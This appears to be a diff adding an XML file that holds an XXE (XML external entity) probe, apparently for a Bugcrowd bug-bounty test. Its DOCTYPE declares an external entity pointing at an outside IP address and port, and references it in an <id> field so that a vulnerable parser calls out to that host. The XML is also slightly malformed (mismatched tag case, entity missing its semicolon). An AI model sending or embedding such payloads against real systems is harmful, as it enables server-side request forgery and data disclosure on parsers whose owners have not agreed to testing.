@@ -1,0 +1,18 @@
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+
+<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://74.72.128.43:1333" >]>
+
+<Prod>
+
+	<Prod>
+
+		<Type>abc</type>
+
+		<name>Bugcrowd</name>
+
+		<id>&xxe</id>
+
+	</Prod>
+
+</Prod>
